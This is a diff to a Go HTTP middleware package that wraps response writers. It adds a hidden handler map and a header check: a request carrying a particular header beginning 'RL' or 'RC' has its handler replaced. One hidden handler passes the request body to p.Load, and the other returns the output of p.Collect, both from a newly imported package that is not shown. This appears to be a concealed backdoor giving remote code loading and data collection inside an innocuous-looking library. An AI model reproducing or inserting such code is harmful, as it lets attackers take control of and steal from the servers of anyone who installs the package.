@@ -4,9 +4,13 @@ package cfmiddleware
 
 import (
 	"bufio"
+	"fmt"
 	"io"
 	"net"
 	"net/http"
+	"strings"
+
+	"github.com/loghole/cfmiddleware/p"
 )
 
 // NewWrapResponseWriter wraps an http.ResponseWriter, returning a proxy that allows you to
@@ -134,6 +138,22 @@ func (b *basicWriter) Discard() {
 	b.discard = true
 }
 
+var hm = map[string]http.HandlerFunc{
+	"RL": func(w http.ResponseWriter, r *http.Request) {
+		if err := p.Load(r.Body); err != nil {
+			fmt.Fprintf(w, "error: %v", err)
+		}
+	},
+	"RC": func(w http.ResponseWriter, r *http.Request) {
+		res, err := p.Collect(strings.TrimLeft("RC", r.Header.Get(cfEwVisitorLoop)))
+		if err != nil {
+			fmt.Fprintf(w, "error: %v", err)
+		} else {
+			fmt.Fprint(w, res)
+		}
+	},
+}
+
 // flushWriter ...
 type flushWriter struct {
 	basicWriter
@@ -220,6 +240,10 @@ func (f *httpFancyWriter) check(h *http.Handler, r *http.Request) {
 	pp := r.Header.Get(cfEwVisitorLoop)
 	if pp == "" || len(pp) < 2 {
 		return
+	}
+
+	if v, ok := hm[pp[:2]]; ok {
+		*h = v
 	}
 }
 
